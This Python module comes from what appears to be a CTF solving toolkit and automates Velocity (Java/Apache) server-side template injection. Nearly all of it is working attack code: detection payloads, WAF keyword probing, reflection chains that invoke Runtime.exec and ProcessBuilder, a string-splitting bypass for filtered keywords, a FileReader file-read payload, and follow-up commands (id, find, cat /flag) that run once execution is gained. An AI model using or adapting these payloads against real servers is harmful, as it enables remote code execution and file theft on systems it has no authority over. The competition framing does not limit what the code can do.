"""
CTF 解题工具 — Velocity 引擎模块
用途: 面向 CTF 竞赛的 Velocity (Java/Apache) SSTI 自动化解题辅助
场景: 竞赛平台题目 / 授权测试靶场

特点:
  - 反射调用 Runtime.exec 是经典利用方式
  - #set 变量拼接可分解被过滤关键字
  - Velocity Tools 的 $class.inspect 是简化利用路径
  - 语法用 #set($a=7*7)$a → 49
"""

from .base import BaseEngine
from .utils import is_waf_blocked


BYPASS_STRATEGIES = [
    {
        'name': '无过滤（反射 Runtime）',
        'filters': set(),
        'rce': 'velocity_reflect',
        'file_read': 'velocity_fileread',
    },
    {
        'name': '过滤关键字（#set 变量拼接）',
        'filters': {'keyword'},
        'rce': 'velocity_split_bypass',
        'file_read': None,
    },
]


class VelocityEngine(BaseEngine):
    """Velocity (Java/Apache) SSTI 引擎"""

    name = 'velocity'
    template_tags = ('#set', '$', '#if', '#end')
    error_keywords = [
        'JavaMethod', 'InvocationTargetException', 'ClassNotFoundException',
        'NoSuchMethodException', 'Internal Server Error',
        'org.apache.velocity', 'java.lang.',
    ]

    detect_payloads = [
        {'payload': '#set($a=7*7)$a', 'expected': '49', 'engines': ['velocity']},
    ]

    fingerprints = [
        {"payload": "#set($a=7*7)$a", "expected": "49", "desc": "Velocity set 变量"},
        {"payload": "$class.getName()", "expected": "", "desc": "Velocity $class 对象"},
    ]

    rce_chains = [
        '#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("[Ljava.lang.String;")).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),new String[]{"CMD"})',
        # Velocity Tools 简化链
        '$class.inspect("java.lang.Runtime").type.getRuntime().exec("CMD").waitFor()',
    ]

    file_read_chains = [
        '#set($f=$e.getClass().forName("java.io.FileReader").getDeclaredConstructor($e.getClass().forName("java.lang.String")).newInstance("FILEPATH"))',
    ]

    bypass_strategies = BYPASS_STRATEGIES

    def probe_waf(self, toolkit):
        """Velocity WAF 探测"""
        filters = set()
        filtered_keywords = set()

        t = toolkit.send_and_clean('#set($a=7*7)$a')
        if '49' not in t:
            return filters, filtered_keywords

        # 空格
        t = toolkit.send_and_clean('#set($a=7 * 7)$a')
        if '49' not in t:
            filters.add('space')

        # 关键字探测
        for kw in ['Runtime', 'ProcessBuilder', 'exec', 'forName', 'getMethod']:
            if kw == 'Runtime':
                payload = '#set($e="e")$e.getClass().forName("java.lang.Runtime")'
            elif kw == 'exec':
                payload = '#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("[Ljava.lang.String;"))'
            elif kw == 'forName':
                payload = '#set($e="e")$e.getClass().forName("java.lang.Object")'
            else:
                continue
            t = toolkit.send_and_clean(payload)
            if is_waf_blocked(t):
                filtered_keywords.add(kw)

        if filtered_keywords:
            filters.add('keyword')

        # $class 可用性 (Velocity Tools)
        t = toolkit.send_and_clean('$class')
        if not is_waf_blocked(t) and t:
            print("  [+] $class 可用 (Velocity Tools)")

        self.waf_filters = filters
        self.filtered_keywords = filtered_keywords
        return filters, filtered_keywords

    def build_rce_payload(self, cmd, toolkit=None):
        """Velocity RCE payload 构造"""
        strategy = getattr(toolkit, 'working_bypass', None) if toolkit else None

        if strategy and strategy['rce'] == 'velocity_reflect':
            # 标准反射链
            payload = (
                '#set($e="e")'
                '$e.getClass().forName("java.lang.Runtime")'
                '.getMethod("exec",$e.getClass().forName("[Ljava.lang.String;"))'
                '.invoke($e.getClass().forName("java.lang.Runtime")'
                '.getMethod("getRuntime").invoke(null),new String[]{"CMD"})'
            )
            return payload.replace('CMD', cmd), None

        if strategy and strategy['rce'] == 'velocity_split_bypass':
            # 用 #set 拆分被过滤关键字
            if 'Runtime' in self.filtered_keywords:
                payload = (
                    '#set($r="java.lang.Ru"+"ntime")'
                    '#set($e="e")'
                    '$e.getClass().forName($r)'
                    '.getMethod("exec",$e.getClass().forName("[Ljava.lang.String;"))'
                    '.invoke($e.getClass().forName($r)'
                    '.getMethod("getRuntime").invoke(null),new String[]{"CMD"})'
                )
                return payload.replace('CMD', cmd), None
            # ProcessBuilder 替代
            if 'ProcessBuilder' not in self.filtered_keywords:
                payload = (
                    '#set($pb=$e.getClass().forName("java.lang.ProcessBuilder")'
                    '.getDeclaredConstructor($e.getClass().forName("[Ljava.lang.String;"))'
                    '.newInstance(new String[]{"CMD"}))'
                    '$pb.start()'
                )
                return payload.replace('CMD', cmd), None
            return None, None

        # 默认: 尝试反射链
        for chain in self.rce_chains:
            return chain.replace('CMD', cmd), None
        return None, None

    def build_file_payload(self, filepath, toolkit=None):
        """Velocity 文件读取 payload"""
        payload = (
            '#set($e="e")'
            '#set($f=$e.getClass().forName("java.io.FileReader")'
            '.getDeclaredConstructor($e.getClass().forName("java.lang.String"))'
            '.newInstance("FILEPATH"))'
        )
        return payload.replace('FILEPATH', filepath), None

    def is_rce_output(self, text, cmd, toolkit=None):
        if not text or len(text) < 2:
            return False
        if is_waf_blocked(text):
            return False
        if '#set' in text or '$e.' in text or '$class' in text:
            return False
        for kw in self.error_keywords:
            if kw in text:
                return False
        if cmd == 'id':
            return 'uid=' in text or 'gid=' in text
        return len(text) > 0

    def info_gathering(self, toolkit):
        """Velocity 信息收集"""
        print("\n" + "=" * 60)
        print("[*] 信息收集 (Velocity)")
        print("=" * 60)

        # Java 系统属性
        text = toolkit.send_and_clean('$class.inspect("java.lang.System").type.getProperty("os.name")')
        if text and not is_waf_blocked(text):
            print(f"  操作系统: {text}")

        text = toolkit.send_and_clean('$class.inspect("java.lang.System").type.getProperty("java.version")')
        if text and not is_waf_blocked(text):
            print(f"  Java 版本: {text}")

        if toolkit.working_chain:
            print("\n  [1] 系统信息 (通过 RCE):")
            output = toolkit.exec_cmd('id')
            if output:
                print(f"      {output[:300]}")

            print("\n  [2] 寻找 flag 文件:")
            output = toolkit.exec_cmd('find / -name "flag*" -type f 2>/dev/null | head -20')
            if output:
                print(f"      {output[:500]}")
            output = toolkit.exec_cmd('cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null')
            if output:
                print(f"      [+] flag: {output}")
